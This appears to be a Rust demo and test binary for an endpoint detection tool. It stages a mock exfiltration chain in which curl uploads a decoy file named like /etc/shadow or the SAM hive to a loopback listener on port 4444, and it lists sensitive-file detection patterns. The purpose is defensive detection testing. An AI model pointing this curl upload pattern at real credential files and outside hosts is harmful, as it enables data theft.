//! Task 3 (p3g6-exfil-chain) LIVE proof of the EXFIL chain — the
//! read-sensitive-then-C2 data-exfiltration attack chain — flowing through the
//! REAL `CorrModule` over the real substrate event bus. It is the sibling of
//! `corr-triple-demo.rs` (which proves the dropper-then-C2 WRITE chain): here
//! ONE curl pid supplies BOTH a suspicious sensitive-file READ and a suspicious
//! CONNECT, so the REAL module's exfil rule
//! (`suspicious_process_read_sensitive_and_connected`, a class-9002 record —
//! see `emit_correlated_exfil` in `crates/modules/corr/src/lib.rs`) fires. Like
//! `corr-triple-demo.rs` it works on EITHER live backend (Linux eBPF ROOT or
//! Windows ETW ADMINISTRATOR) because both a suspicious connect and a
//! read-of-sensitive-file are observable on both substrates.
//!
//! # The attack-chain staging: ONE curl pid does BOTH halves
//! The exfil chain needs ONE pid to make a suspicious CONNECT and a suspicious
//! sensitive-file READ within the module's `CHAIN_WINDOW`. This demo stages
//! that with a LOCAL loopback responder + a single curl invocation, mirroring
//! the triple demo but swapping the write half for a read half:
//!
//! ```text
//! curl --max-time 5 -s -T <PROBE_PATH> http://127.0.0.1:4444/ -o <null device>
//! ```
//!
//! * A bounded local HTTP responder (a `std::net::TcpListener` bound to
//!   `127.0.0.1:4444`) is spun up in ONE helper thread BEFORE the curl loop.
//!   For each connection it reads/ignores the uploaded request, writes a
//!   minimal valid HTTP response, then drops the stream. Port **4444** is a
//!   netmon `SUSPICIOUS_PORT` (Metasploit's default LPORT — see
//!   `SUSPICIOUS_PORTS` in `crates/modules/netmon/src/lib.rs`), which
//!   `torda_mod_netmon::assess` flags `"suspicious_port"` (MEDIUM) on the PORT
//!   ALONE, regardless of the loopback IP. That is the **suspicious CONNECT**
//!   half.
//! * curl's exec is the LOLBin signal — `torda_mod_procmon::assess` flags `curl`
//!   (see `LOLBINS` in `crates/modules/procmon/src/lib.rs`), so the process
//!   half of both component rules is suspicious.
//! * `-T <PROBE_PATH>` makes curl OPEN the probe path for READING (to upload
//!   it) — a `FileOpen` (read) event — the **suspicious READ** half. UNLIKE
//!   the triple demo's `-o` write (where curl creates the destination file),
//!   curl reading requires the probe file to ALREADY EXIST and be non-empty,
//!   so this binary pre-creates it with a few bytes BEFORE `corr.start()`
//!   (before the module subscribes), so the demo's own pre-population write is
//!   never observed on the live bus. `-o <null device>` discards curl's own
//!   response output so no stray write is introduced by this demo (the OS null
//!   device is never a watched path — see `probe_paths` and the ignore list).
//!
//! The SAME curl pid produced both suspicious signals, so the REAL `CorrModule`
//! fires `CORRELATED_RULE` (connect) AND — the point of this demo — joins that
//! attributed connect verdict with the attributed sensitive-read verdict into
//! the EXFIL `suspicious_process_read_sensitive_and_connected` record. A local
//! loopback responder makes the connect offline and deterministic.
//!
//! # The probe path MUST pass BOTH `considers()` AND `read_of_sensitive_file`
//! `CorrModule` gates every `FileOpen` through the DEFAULT `FilePolicy`
//! (`crates/modules/filemon/src/lib.rs`) before it is even re-judged, and then
//! re-judges it with `torda_mod_filemon::assess(path, /*write=*/false)` — only a
//! path that trips the `read_of_sensitive_file` rule feeds the exfil chain. So
//! the probe path embeds BOTH a WATCH substring AND a `SENSITIVE_READ_FILES`
//! substring as literal path COMPONENTS, and lives UNDER the user's HOME
//! (never the real system directory it names):
//!   * **Linux:** `<HOME>/torda-corr-exfil-probe-<pid>/etc/shadow` — the literal
//!     `/etc/` component makes `considers()` watch it, and the literal
//!     `/etc/shadow` component trips `read_of_sensitive_file`; `<HOME>/...` is
//!     never the real `/etc/shadow`.
//!   * **Windows:** `<USERPROFILE>\torda-corr-exfil-probe-<pid>\Windows\System32\config\SAM`
//!     — the literal `\Windows\System32\` component is a watch substring (as
//!     is `\System32\Config\`), and the literal `\System32\Config\SAM`
//!     component trips `read_of_sensitive_file`; it lives under the user's
//!     profile, never touching the REAL `C:\Windows\System32\config\SAM`.
//!
//! `verify_probe_gates` below asserts BOTH gates in code — `considers(path)`
//! and `assess(path, false)` firing `read_of_sensitive_file` — against the
//! SAME public `FilePolicy`/`assess` the real module uses, and prints a rich
//! diagnostic + exits 1 if either does not hold, so a probe-path regression is
//! caught before any live activity is generated (rather than surfacing only as
//! a confusing zero-match self-assert at the end).
//!
//! These are just probe subdirs named `etc`/`Windows\System32\config` under
//! the demo-runner's own HOME — nothing here reads or writes a real credential
//! path. `curl -T` does NOT create parent directories (and here the probe must
//! already exist for curl to read it), so this binary `create_dir_all`s the
//! probe parent and writes a few probe bytes BEFORE spawning curl, and
//! best-effort removes the whole `torda-corr-exfil-probe-<pid>` directory when
//! done (success AND failure paths).
//!
//! # Honest about which path this is on (mirrors `corr-triple-demo.rs`)
//!   * NON-privileged (or both features off): `Substrate::for_this_platform()`
//!     fell back to the stub bus (`bus_label` is neither `"ebpf"` nor `"etw"`).
//!     There is no real OS activity to correlate, so the demo prints a clear
//!     "run elevated" instruction for `--bin corr-exfil-demo` and exits 0. It
//!     does NOT assert or fake a detection. THIS is the path a non-elevated
//!     default run verifies.
//!   * ROOT in WSL with `--features linux-ebpf`, or ADMINISTRATOR with
//!     `--features windows-etw`: the real bus started. The demo pre-creates the
//!     probe file, verifies its own probe-path gates, starts the bounded
//!     responder, wires the REAL `CorrModule` + a capturing emitter, `init()`s
//!     and `start()`s it (so it subscribes BEFORE any curl spawns), generates
//!     the chain via several bounded curl invocations, waits a bounded window,
//!     then self-asserts the EXFIL record specifically.
//!
//! Every wait is bounded: the responder uses non-blocking accept + read/write
//! timeouts + a hard deadline and is JOINED (bounded) at the end; each `curl
//! --max-time 5` spawn is bounded; the capture window is a deadline-bounded
//! poll loop; dropping the substrate tears live collection down (the real
//! bus's `Drop` stops + joins). The responder binds loopback-only and is
//! DEMO-ONLY.
//!
//! DEMO-ONLY: no library was edited — it uses only the public `CorrModule` +
//! `ModuleCtx` + `Substrate` + `FilePolicy::default()`'s documented contract +
//! `torda_mod_filemon::assess` + a `std::net::TcpListener` + `std::process::Command`
//! (no new dependency).

use std::io::{Read, Write};
use std::net::TcpListener;
use std::path::Path;
use std::sync::{Arc, Mutex};
use std::thread;
use std::time::{Duration, Instant};

use torda_core::{
    Module, ModuleCtx, OcsfEmitter, ResourceBudget, ResourceGovernor, ResourceSampler,
    ResourceUsage,
};
use torda_ocsf::OcsfEnvelope;

/// Total wall-clock window to wait for the capturing emitter to accumulate the
/// exfil record on the live path.
const CAPTURE_WINDOW: Duration = Duration::from_secs(5);
/// Poll interval while waiting for the capturing emitter to fill up.
const POLL_INTERVAL: Duration = Duration::from_millis(50);
/// Number of curl attempts. A few repeats make the live proof robust to any
/// single dropped/lagged event, mirroring `corr-triple-demo.rs`'s pacing.
const NUM_CURL_ATTEMPTS: usize = 5;
/// Small pause between curl spawns so each attempt's read+connect pair has a
/// clear window to be drained before the next attempt starts.
const INTER_ATTEMPT_SLEEP: Duration = Duration::from_millis(200);
/// The suspicious C2 port the responder listens on and curl dials. It is a
/// netmon `SUSPICIOUS_PORT` (flagged by port alone, regardless of the loopback
/// IP), which is what makes the connect half suspicious.
const RESPONDER_PORT: u16 = 4444;
/// The loopback address:port the responder binds and curl connects to.
const RESPONDER_ADDR: &str = "127.0.0.1:4444";
/// A minimal valid HTTP response the responder writes for each connection.
/// Unlike the triple demo's responder, this one need not carry a body: curl is
/// UPLOADING the probe file (`-T`), not downloading into it, so nothing here
/// drives a file-write. `Connection: close` lets curl finish promptly.
const HTTP_RESPONSE: &[u8] = b"HTTP/1.1 200 OK\r\nContent-Length: 0\r\nConnection: close\r\n\r\n";
/// Hard deadline for the responder thread: it serves `NUM_CURL_ATTEMPTS`
/// connections then exits early, but this bound guarantees it can never hang
/// (and the end-of-run join is therefore always bounded) even if fewer curls
/// connect than expected. Generous enough to cover the whole curl loop +
/// capture window worst case.
const RESPONDER_HARD_DEADLINE: Duration = Duration::from_secs(45);
/// Bounded accept/read/write timeouts inside the responder so no single
/// connection can wedge it.
const RESPONDER_IO_TIMEOUT: Duration = Duration::from_millis(500);
/// The EXFIL chain rule this demo exists to prove — see `CORRELATED_EXFIL_RULE`
/// in `crates/modules/corr/src/lib.rs` (private to that crate, so mirrored here
/// as a literal exactly as `corr-triple-demo.rs` mirrors its own chain rule).
const CORRELATED_EXFIL_RULE: &str = "suspicious_process_read_sensitive_and_connected";

/// Captures every OCSF envelope the module emits so the demo can inspect them
/// and self-assert (the production binary's `StdoutEmitter` writes NDJSON
/// instead).
#[derive(Default)]
struct CapturingEmitter {
    records: Arc<Mutex<Vec<OcsfEnvelope>>>,
}
impl OcsfEmitter for CapturingEmitter {
    fn emit(&self, rec: OcsfEnvelope) {
        self.records.lock().expect("emitter lock").push(rec);
    }
}

/// A constant-ZERO sampler: the governor needs a sampler but this demo never
/// exercises throttling, so a zero reading keeps it dependency-free.
struct ZeroSampler;
impl ResourceSampler for ZeroSampler {
    fn sample(&self) -> ResourceUsage {
        ResourceUsage::ZERO
    }
}

/// Builds the OS-appropriate probe directory root, the probe file path (the
/// READ target), and the lowercase path TAIL used to match a (possibly
/// NT-device-prefixed, on ETW) reported path back to this probe. All three are
/// namespaced by this process's own pid so concurrent runs never collide. The
/// probe path is chosen to satisfy BOTH `FilePolicy::default().considers()`
/// AND `torda_mod_filemon::assess(_, false)`'s `read_of_sensitive_file` rule —
/// verified in code by `verify_probe_gates` before any live activity runs.
fn probe_paths() -> (String, String, String) {
    let demo_pid = std::process::id();
    if cfg!(windows) {
        let home = std::env::var("USERPROFILE").unwrap_or_else(|_| r"C:\Users\Default".into());
        let root = format!(r"{home}\torda-corr-exfil-probe-{demo_pid}");
        let path = format!(r"{root}\Windows\System32\config\SAM");
        let tail = format!(r"torda-corr-exfil-probe-{demo_pid}\windows\system32\config\sam");
        (root, path, tail)
    } else {
        let home = std::env::var("HOME").unwrap_or_else(|_| "/root".into());
        let root = format!("{home}/torda-corr-exfil-probe-{demo_pid}");
        let path = format!("{root}/etc/shadow");
        let tail = format!("torda-corr-exfil-probe-{demo_pid}/etc/shadow");
        (root, path, tail)
    }
}

/// The OS null device curl's `-o` discards its HTTP response body into, so
/// this demo introduces no stray write of its own (never a watched/sensitive
/// path — `/dev/` is in the DEFAULT policy's `ignore` list, and `NUL` matches
/// no watch substring at all).
fn null_device() -> &'static str {
    if cfg!(windows) {
        "NUL"
    } else {
        "/dev/null"
    }
}

/// Verifies, against the SAME public `FilePolicy`/`assess` the real
/// `CorrModule` uses, that the chosen probe path satisfies BOTH required
/// gates: (1) `FilePolicy::default().considers(path)` and (2)
/// `torda_mod_filemon::assess(path, /*write=*/false)` fires `read_of_sensitive_file`.
/// If either does not hold, prints a rich diagnostic and exits 1 — this is a
/// bug in THIS demo's probe construction, not in the module under test, and
/// catching it here avoids a confusing zero-match self-assert at the end.
fn verify_probe_gates(probe_path: &str) {
    let considers = torda_mod_filemon::FilePolicy::default().considers(probe_path);
    let assessment = torda_mod_filemon::assess(probe_path, false);
    let rules: Vec<&str> = assessment.hits.iter().map(|h| h.rule).collect();
    let has_sensitive_read = rules.contains(&"read_of_sensitive_file");

    if !considers || !has_sensitive_read {
        eprintln!(
            "\nFAILURE: the probe path does not satisfy the gates this demo requires — this is a \
             bug in `corr-exfil-demo.rs`'s own probe construction, not the CorrModule under test.\n\
             probe path: {probe_path}\n\
             \x20 - FilePolicy::default().considers(probe_path) = {considers} (must be true: a \
             WATCH substring with no IGNORE substring — crates/modules/filemon/src/lib.rs)\n\
             \x20 - torda_mod_filemon::assess(probe_path, false).hits rules = {rules:?} (must contain \
             \"read_of_sensitive_file\"; SENSITIVE_READ_FILES is \"/etc/shadow\", \".ssh/id_\", \
             \"\\\\system32\\\\config\\\\sam\", \"/etc/sudoers\")\n\
             Fix `probe_paths()` in this file so the probe path embeds both a WATCH substring and \
             a SENSITIVE_READ_FILES substring as literal path components."
        );
        std::process::exit(1);
    }
    println!(
        "probe path gates verified: considers(probe)=true, assess(probe, false) fires \
         read_of_sensitive_file (rules={rules:?})"
    );
}

/// The responder loop, running on its own thread: serve up to
/// `NUM_CURL_ATTEMPTS` loopback connections (each: read+ignore the uploaded
/// request, write `HTTP_RESPONSE`, drop the stream), then exit. Bounded on
/// every axis — non-blocking accept with a short poll sleep, per-connection
/// read/write timeouts, and a hard wall-clock deadline — so it can never hang
/// and the end-of-run join is always bounded. Takes ownership of a listener
/// already bound by the caller (so a bind failure is handled BEFORE the
/// thread spawns).
fn run_responder(listener: TcpListener) {
    let deadline = Instant::now() + RESPONDER_HARD_DEADLINE;
    let mut served = 0usize;
    while served < NUM_CURL_ATTEMPTS && Instant::now() < deadline {
        match listener.accept() {
            Ok((mut stream, _)) => {
                let _ = stream.set_read_timeout(Some(RESPONDER_IO_TIMEOUT));
                let _ = stream.set_write_timeout(Some(RESPONDER_IO_TIMEOUT));
                // Read and ignore the uploaded request bytes (headers + the
                // small probe body); a single bounded read is sufficient
                // since the probe file is only a few bytes and loopback
                // delivers it in one segment.
                let mut buf = [0u8; 4096];
                let _ = stream.read(&mut buf);
                let _ = stream.write_all(HTTP_RESPONSE);
                let _ = stream.flush();
                served += 1;
                drop(stream);
            }
            Err(ref e) if e.kind() == std::io::ErrorKind::WouldBlock => {
                // No pending connection yet; brief bounded sleep, then re-poll.
                thread::sleep(Duration::from_millis(20));
            }
            Err(_) => break, // listener error → stop; the demo's deadlines still bound us.
        }
    }
}

#[tokio::main]
async fn main() {
    // 1) Build the shared substrate for THIS host and report the live bus.
    let sub = torda_substrate::Substrate::for_this_platform();
    println!("event bus: {}", sub.bus_label);

    // 2) Stub path (NON-privileged / both features off / unsupported OS): be
    // honest, instruct, exit 0. No real OS events exist to correlate here.
    if sub.bus_label != "ebpf" && sub.bus_label != "etw" {
        println!(
            "\nNo live event bus active (running on the '{}' bus) — no real process/file/network \
             events to correlate.\n\
             To see the REAL EXFIL chain (the real CorrModule joining ONE curl's suspicious \
             connect to :4444 AND its `-T` read of a sensitive-named probe into \
             `{CORRELATED_EXFIL_RULE}`), build then run ELEVATED:\n\
             \x20   Linux (ROOT in WSL):\n\
             \x20     CARGO_TARGET_DIR=$HOME/torda-ebpf-target cargo run -p torda \\\n\
             \x20         --features linux-ebpf --bin corr-exfil-demo\n\
             \x20     (or: wsl -u root)\n\
             \x20   Windows (ADMINISTRATOR):\n\
             \x20     cargo run -p torda --features windows-etw --bin corr-exfil-demo\n\
             (loading eBPF requires root/CAP_BPF; the ETW session requires Administrator.)",
            sub.bus_label
        );
        // Nothing to assert: there are no real OS events on the stub bus.
        return;
    }

    // 3) Live path (ROOT / ADMINISTRATOR): run the REAL CorrModule against the
    // real bus and prove the real EXFIL chain (read-sensitive-then-C2).
    println!(
        "'{}' event bus live — wiring the real CorrModule onto the real bus and capturing the \
         real EXFIL chain for up to {CAPTURE_WINDOW:?}...",
        sub.bus_label
    );

    let (probe_root, probe_path, probe_tail) = probe_paths();
    let probe_parent = Path::new(&probe_path)
        .parent()
        .expect("probe path has a parent")
        .to_path_buf();
    std::fs::create_dir_all(&probe_parent).unwrap_or_else(|e| {
        panic!("failed to create probe parent dir {probe_parent:?}: {e}");
    });
    println!(
        "probe path: {probe_path} (a probe subdir under HOME — never the real system directory \
         it names)"
    );

    // Verify BOTH gates against the SAME public policy/ruleset the real module
    // uses, BEFORE generating any activity — catches a probe-path regression
    // immediately with a clear diagnostic rather than a confusing zero-match
    // self-assert at the end.
    verify_probe_gates(&probe_path);

    // Pre-create the probe file with a few bytes BEFORE `corr.start()` (the
    // module hasn't subscribed yet), so this demo's own pre-population write
    // is never observed on the live bus. UNLIKE the triple demo (where curl's
    // `-o` creates the destination file), curl's `-T` READS the probe, so it
    // must already exist and be non-empty.
    std::fs::write(&probe_path, b"torda-corr-exfil-probe-bytes\n").unwrap_or_else(|e| {
        let _ = std::fs::remove_dir_all(&probe_root);
        panic!("failed to pre-create probe file {probe_path}: {e}");
    });

    // Bind the loopback responder BEFORE spawning its thread so a bind failure
    // (e.g. port 4444 already in use) is handled here: clean up and exit 0
    // (an environment condition, not a detection failure — never panic/hang).
    let listener = match TcpListener::bind(RESPONDER_ADDR) {
        Ok(l) => l,
        Err(e) => {
            eprintln!(
                "could not bind the loopback responder on {RESPONDER_ADDR} ({e}) — port {RESPONDER_PORT} \
                 is likely already in use. Free it and re-run. Exiting 0 (no detection to assert)."
            );
            let _ = std::fs::remove_dir_all(&probe_root);
            drop(sub);
            return;
        }
    };
    // Non-blocking accept so the responder loop can honor its hard deadline.
    listener
        .set_nonblocking(true)
        .expect("set responder listener non-blocking");
    let responder = thread::spawn(move || run_responder(listener));
    println!("loopback responder listening on {RESPONDER_ADDR} (bounded; serves {NUM_CURL_ATTEMPTS} connections then exits)");

    let records: Arc<Mutex<Vec<OcsfEnvelope>>> = Arc::new(Mutex::new(Vec::new()));
    let emitter: Arc<dyn OcsfEmitter> = Arc::new(CapturingEmitter {
        records: records.clone(),
    });
    let governor = Arc::new(ResourceGovernor::new(
        ResourceBudget::from_env(),
        Box::new(ZeroSampler),
    ));

    let ctx = ModuleCtx {
        bus: sub.bus.clone(),
        snapshot: sub.snapshot.clone(),
        emitter,
        governor,
        tenant_id: "tenant-demo".to_string(),
        product: "torda".to_string(),
        version: env!("CARGO_PKG_VERSION").to_string(),
    };

    // The SAME real module the agent registers. It subscribes to
    // ProcessExec + ProcessExit + NetConnect + FileWrite + FileOpen on the
    // real bus BEFORE we generate any activity, so no event is missed.
    let mut corr = torda_mod_corr::CorrModule::new();
    corr.init(ctx).await.expect("corr init");
    corr.start()
        .await
        .expect("corr start (subscribes before we spawn curl)");

    // 3a) Generate the chain: spawn curl several times, each doing BOTH halves
    // in ONE invocation — READ the sensitive-named probe path (via `-T`,
    // curl's upload flag) AND CONNECT to the local suspicious-port responder.
    // Each spawn execs the LOLBin `curl` (procmon flags it), opens the probe
    // for reading (filemon's read_of_sensitive_file rule fires), and connects
    // to 127.0.0.1:4444 (netmon flags `suspicious_port`). Same curl pid for
    // both signals → corr fires the connect rule AND the EXFIL chain.
    // `--max-time 5` bounds each spawn; `-o <null>` discards curl's own
    // response output so no stray write is introduced; the curl result is
    // ignored.
    let null_out = null_device();
    println!(
        "spawning curl x{NUM_CURL_ATTEMPTS}, each: -T {probe_path} (read the sensitive-named \
         probe) AND connect http://{RESPONDER_ADDR}/ (suspicious port {RESPONDER_PORT})"
    );
    let url = format!("http://{RESPONDER_ADDR}/");
    for i in 0..NUM_CURL_ATTEMPTS {
        let _ = std::process::Command::new("curl")
            .args([
                "--max-time",
                "5",
                "-s",
                "-T",
                &probe_path,
                "-o",
                null_out,
                &url,
            ])
            .status();
        println!("  curl attempt {} done", i + 1);
        thread::sleep(INTER_ATTEMPT_SLEEP);
    }

    // Collect for a bounded window: poll the capturing emitter's Vec for the
    // EXFIL record specifically (not a mere connect-rule 9002).
    let probe_tail_lower = probe_tail.to_ascii_lowercase();
    let is_exfil_for_probe = |env: &OcsfEnvelope| -> bool {
        let has_exfil_rule = env.data["detections"]
            .as_array()
            .map(|a| a.iter().any(|d| d["rule"] == CORRELATED_EXFIL_RULE))
            .unwrap_or(false);
        let attributed = env.data["process"]["attributed"].as_bool().unwrap_or(false);
        let path_lower = env.data["file"]["path"]
            .as_str()
            .unwrap_or("")
            .to_ascii_lowercase();
        let op = env.data["file"]["op"].as_str().unwrap_or("");
        let dport = env.data["connection"]["dport"].as_u64().unwrap_or(0);
        has_exfil_rule
            && attributed
            && op == "read"
            && path_lower.ends_with(&probe_tail_lower)
            && dport == RESPONDER_PORT as u64
    };

    let deadline = tokio::time::Instant::now() + CAPTURE_WINDOW;
    while tokio::time::Instant::now() < deadline {
        let seen = records.lock().unwrap().iter().any(is_exfil_for_probe);
        if seen {
            break;
        }
        tokio::time::sleep(POLL_INTERVAL).await;
    }

    corr.stop().await.expect("corr clean shutdown");

    // The responder serves NUM_CURL_ATTEMPTS then exits (and has a hard
    // deadline), so this join is bounded — it has almost certainly already
    // finished by now.
    let _ = responder.join();

    // 4) Inspect the captured OCSF envelopes. Print EVERY class-9002 record for
    // diagnosis, and count the EXFIL-for-probe matches.
    let emitted = records.lock().unwrap().clone();
    let mut nine_thousand_two = 0usize;
    let mut exfil_matches = 0usize;

    for env in emitted.iter() {
        // Only Correlated Activity (9002) records carry these fields; others
        // (e.g. an asset/health record, unlikely here) are skipped from the dump.
        if env.class_uid != torda_ocsf::class::CORRELATED_ACTIVITY {
            continue;
        }
        nine_thousand_two += 1;
        let pid = &env.data["process"]["pid"];
        let image = env.data["process"]["image"].as_str().unwrap_or("?");
        let attributed = env.data["process"]["attributed"].as_bool().unwrap_or(false);
        let path = env.data["file"]["path"].as_str().unwrap_or("-");
        let op = env.data["file"]["op"].as_str().unwrap_or("-");
        let dport = env.data["connection"]["dport"].as_u64().unwrap_or(0);
        let rules: Vec<&str> = env.data["detections"]
            .as_array()
            .map(|a| a.iter().filter_map(|d| d["rule"].as_str()).collect())
            .unwrap_or_default();
        let is_exfil = is_exfil_for_probe(env);
        if is_exfil {
            exfil_matches += 1;
        }
        println!(
            "pid={pid} image={image} path={path} op={op} dport={dport} attributed={attributed} \
             severity_id={} detections={rules:?} exfil_match={is_exfil}",
            env.severity_id
        );
    }

    // 5) Self-assert the CRITICAL thing this demo exists to prove: the EXFIL
    // chain fired — a class-9002 record carrying `CORRELATED_EXFIL_RULE`,
    // attributed, a `file.op == "read"` of OUR probe path, to port 4444. A
    // mere connection-rule 9002 does NOT satisfy this.
    if exfil_matches < 1 {
        eprintln!(
            "\nFAILURE: no attributed `{CORRELATED_EXFIL_RULE}` (EXFIL) record was captured for \
             the probe path + port {RESPONDER_PORT}.\n\
             Captured {nine_thousand_two} Correlated Activity (9002) record(s) total, but none was \
             the attributed EXFIL for our probe. Check:\n\
             \x20 - `torda_mod_procmon::assess(\"curl\")` still flags curl as a lolbin \
             (crates/modules/procmon/src/lib.rs)\n\
             \x20 - `torda_mod_netmon::assess(_, {RESPONDER_PORT})` still flags `suspicious_port` \
             (crates/modules/netmon/src/lib.rs) — port {RESPONDER_PORT} must stay in SUSPICIOUS_PORTS\n\
             \x20 - `FilePolicy::default().considers(\"{probe_path}\")` still returns true \
             (crates/modules/filemon/src/lib.rs) — a WATCH substring, no IGNORE substring\n\
             \x20 - `torda_mod_filemon::assess(\"{probe_path}\", false)` still fires \
             `read_of_sensitive_file` (SENSITIVE_READ_FILES in crates/modules/filemon/src/lib.rs)\n\
             \x20 - the loopback responder actually accepted the connection (curl's `-T` open of \
             the probe happens regardless, but the connect must still succeed within --max-time); \
             check the bind on {RESPONDER_ADDR} succeeded and the probe file existed/was non-empty\n\
             \x20 - CorrModule's read+connect join / CHAIN_WINDOW (crates/modules/corr/src/lib.rs, \
             record_read_and_maybe_exfil / record_connect_and_maybe_chain / maybe_fire_exfil) — \
             BOTH the read and the connect must fire (attributed) for the SAME pid within the window"
        );
        let _ = std::fs::remove_dir_all(&probe_root);
        drop(sub);
        std::process::exit(1);
    }

    // 6) Success summary.
    println!(
        "\nOK: captured {nine_thousand_two} Correlated Activity record(s); {exfil_matches} \
         attributed `{CORRELATED_EXFIL_RULE}` (EXFIL) record(s) matched the probe path + port \
         {RESPONDER_PORT} — the real read-sensitive-then-C2 exfil chain (one curl that read a \
         sensitive-named probe AND connected to :{RESPONDER_PORT}) is live."
    );

    // Best-effort cleanup of the whole probe directory tree.
    let _ = std::fs::remove_dir_all(&probe_root);

    // Drop the substrate -> the live bus's Drop stops collection + joins.
    drop(sub);
}
